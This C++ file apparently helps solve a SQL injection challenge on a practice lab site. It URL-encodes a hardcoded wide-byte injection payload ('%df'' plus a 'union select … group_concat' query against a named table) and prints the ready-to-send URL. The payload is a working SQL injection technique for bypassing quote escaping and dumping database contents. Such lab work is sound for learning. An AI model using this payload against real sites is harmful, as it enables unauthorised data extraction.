/*************************************************************************
	> File Name: paser.cpp
	> Author: DevilBin 
	> Mail: whu.evil.binary@gmail.com 
	> Created Time: 2016/4/10 14:37:15
 ************************************************************************/

#include <iostream>
#include <iomanip>
#include <fstream>
#include <cstdlib>
#include <string>
#include <vector>
#include <deque>
#include <list>
#include <map>
#include <algorithm>
#include <sstream>
#include <climits>

using namespace std;

int main() {
    string temp;
    vector<string> symbol_0 = {"%df", "'", " ", "(", ")", "#"};
    vector<string> symbol_1 = {"%df", "%27", "%20", "%28", "%29", "%23"};
    string s = "http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%df' union select 1,group_concat(title_1),group_concat(content_1) from sae_user_sqli4#";

    bool flag = true;
    unsigned index = 0;
    while(index < s.size()) {
        string sub_string_1 = s.substr(index, 1);
        string sub_string_3 = s.substr(index, 3);
        for(unsigned i = 0; i < symbol_0.size(); ++i) {
            if(symbol_0[i] == sub_string_3) {
                temp += symbol_1[i];
                index += 3;
                flag = false;
            }
            else if(symbol_0[i] == sub_string_1) {
                temp += symbol_1[i] ;
                index += 1;
                flag = false;
            }
        }
        if(flag) {
            temp += s[index];
            ++index;
        }
        flag = true;
    }
    cout << temp << endl;
    return 0;
}
